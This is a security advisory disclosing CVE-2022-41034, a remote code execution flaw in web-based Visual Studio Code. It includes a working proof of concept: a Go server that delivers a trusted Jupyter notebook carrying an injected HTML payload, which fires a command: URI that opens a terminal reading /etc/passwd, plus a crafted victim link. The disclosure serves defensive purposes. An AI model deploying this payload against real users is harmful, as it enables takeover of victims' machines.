---
title: 'Visual Studio Code: Remote Code Execution'
severity: Critical
ghsa_id: GHSA-pw56-c55x-cm9m
cve_id: CVE-2022-41034
weaknesses: []
products:
- ecosystem: Microsoft
  package_name: Visual Studio
  affected_versions: v1.4.0 - v1.71.1
  patched_versions: v1.73.1
cvss: null
credits:
- github_user_id: Zemnmez
  name: Thomas Neil James Shadwell
  avatar: https://avatars.githubusercontent.com/u/4625198?s=40&v=4
---

### Summary
An attacker could, through a link or website, take over the computer of a Visual Studio Code user and any computers they were connected to via the [Visual Studio Code Remote Development](https://code.visualstudio.com/docs/remote/remote-overview) feature. This issue affected at least [GitHub Codespaces](https://github.com/features/codespaces), [github.dev](http://github.dev/), the web-based [Visual Studio Code for Web](https://code.visualstudio.com/blogs/2021/10/20/vscode-dev) and to a lesser extent Visual Studio Code desktop.

### Severity
Critical - This vulnerability allows remote code execution for any computer connected via Visual Studio Code.

### Proof of Concept
Visual Studio Code places various levels of security restriction on content opened in the editor to prevent a malicious attacker creating a view window that is able to execute a ‘command:’ link.

A primary method by which the editor performs these restrictions is the internal trust model, which retains an ‘isTrusted’ annotation when views are opened. Documents that are opened with ‘isTrusted’ set to true are able to execute ‘command:’ URIs, as well as [directly create](https://github.com/microsoft/vscode/blob/c6698eacedf365c2f152f1df85a79bd6da71fa02/extensions/notebook-renderers/src/index.ts#L257) unsafe HTML in Jypiter Notebook mode.

A Jypiter Notebook is a type of rich text document supported out of the box by Visual Studio Code. Used primarily in data science, it is made up of multiple segments of Python code, Markdown, HTML and other formats. The Python code is run on the viewer machine to generate diagrams. Because running potentially foreign or malicious code is dangerous, a Jypiter notebook normally starts in untrusted mode and the user is shown a dialog to confirm trust. When the document is trusted most security restrictions are bypassed.

Each Visual Studio Code window is its own instance of Visual Studio Code. To facilitate opening the same file in a new editor window, an ‘openFile’ parameter [is provided](https://github.com/microsoft/vscode/blob/f6a08e816d98ff72df37a1af4165742366fe2235/src/vs/workbench/services/environment/browser/environmentService.ts#L334) for the editor internals to construct. openFile is a ‘payload’ parameter, where ‘payload’ is a series of flags given to the editor via URL query parameters when it starts. Files opened this way are opened in trusted mode because the editor assumes that it was triggered by a user gesture in the editor.

The payload parameter is a query-encoded JSON. The unencoded form for opening a local file from ``` c:/something.txt ``` looks like this: ``` [["openFile","file://c:/something.txt"]]``` . This then becomes ``` ?payload=%5B%5B%22openFile%22%2C%22file%3A%2F%2Fc%3A%2Fsomething.txt%22%5D%5D. ```

We can prepare an HTTP server that always allows its remote content to be downloaded via CORS. If Visual Studio Code loads this remote file from a URL that ends in ‘.ipynb’, it will be opened as a Jypiter Notebook in trusted mode immediately when the user follows the link.

```go
// https://golang.org
package main

import "net/http"

const file = `{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<img src=a onerror=\"let q = document.createElement('a');q.href='command:workbench.action.terminal.new?
%7B%22config%22%3A%7B%22executable%22%3A%22vim%22%2C%22args%22%3A%5B%22%2Fetc%2Fpasswd%22%5D%
7D%7D';document.body.appendChild(q);q.click()\"/>"
   ]
  }
]}`

func Do() (err error) {
	return http.ListenAndServe(":http-alt" /* 8080 */, http.HandlerFunc(func(rw http.ResponseWriter, rq *http.Request) {
		rw.Header().Set("Access-Control-Allow-Origin", "*")
		rw.Write([]byte(file))
	}))
}

func main() {
	if err := Do(); err != nil {
		panic(err)
	}
}
```
The contents of the ‘file’ in this code are a single Markdown cell in ipynb format. Because Markdown [allows arbitrary HTML](https://daringfireball.net/projects/markdown/syntax#html), in trusted mode, we can inject any HTML code we want into the webview.

For legacy security reasons, you can’t run JavaScript code directly from <script> tags in HTML code that is injected after the page fully loads. To mitigate this our code creates an image, an ``` <a>``` tag with a target that does not exist. The tag is configured so that upon the immediate failure it runs our JavaScript code.

Because ‘command:’ is not a standard browser feature, VSCode injects this functionality by detecting when an ‘a’ element, a link is added to the document. Our JavaScript code creates this link, adds it to the page and then immediately clicks it as though the user did themselves.

This gives us the ability to run arbitrary commands via the ``` command:``` URI feature but to take over the victim’s computer or the computer they’re connected to, we need to issue commands directly to the victim’s machine. We start with the command ‘[workbench.action.terminal.new](https://github.com/microsoft/vscode/blob/3e4e3518165e78181d2275e7745a8a59cea32e18/src/vs/workbench/contrib/terminal/browser/terminalActions.ts#L1874)’. This identifier isn’t documented, but can be found in the source code.

Command URIs may [specify](https://github.com/microsoft/vscode/blob/e8eb39bac26ddc87f27ed69fa06c54cd230d18f9/src/vs/editor/browser/services/openerService.ts#L50) ‘args’ in the query component of the URI, which are [passed to the command](https://github.com/microsoft/vscode/blob/e8eb39bac26ddc87f27ed69fa06c54cd230d18f9/src/vs/workbench/services/commands/common/commandService.ts#L88) as though it was called directly from JavaScript. ‘workbench.action.terminal.new’ can take an [ICreateTerminalOptions](https://github.com/microsoft/vscode/blob/962c94e0472b94f90bdbbd2fcea85962a2fb12ff/src/vs/workbench/contrib/terminal/browser/terminal.ts#L276) object which itself has an [IShellLaunchConfig](https://github.com/microsoft/vscode/blob/b91245de85dc5429ad340fa491abaa4510da4ec4/src/vs/platform/terminal/common/terminal.ts#L410) object as its ‘config’ parameter. IShellLaunchConfig has an ‘executable’ parameter which lets you override the command the program tries to run when it starts.

Thus, our command [URI](command:workbench.action.terminal.new?%7B%22config%22%3A%7B%22executable%22%3A%22vim%22%2C%22args%22%3A%5B%22%2Fetc%2Fpasswd%22%5D%7D%7D), which makes the user launch a new terminal, and instructs that terminal to run ‘vim /etc/passwd’. This opens the password file of the user’s computer, demonstrating our ability to run code on their machine.

Once the server described above is run, when victim clicks a prepared link (for example ``` https://vscode.dev/?payload=%5B%5B%22openFile%22,%22https://%5Bserver_location_goes_here%5D/something.ipynb%22 ```) VSCode will load the file, detect it as a Jypiter Notebook, and immediately run a command on the user’s machine.


### Further Analysis
This vulnerability affected vscode.dev, CodeSpaces and may affect other web-based implementations of VSCode OSS.  VSCode vulnerability [disclosure](https://github.com/microsoft/vscode/security/advisories/GHSA-q6rv-h25q-6pj6).  

This vulnerability has been remediated by [Microsoft patch](https://github.com/microsoft/vscode/commit/d2cff714d5410c570043e259fd72c75bbf387b7a)

### Timeline
**Date reported**: 8/24/2022
**Date fixed**: 10/11/2022
**Date disclosed**: 11/22/2022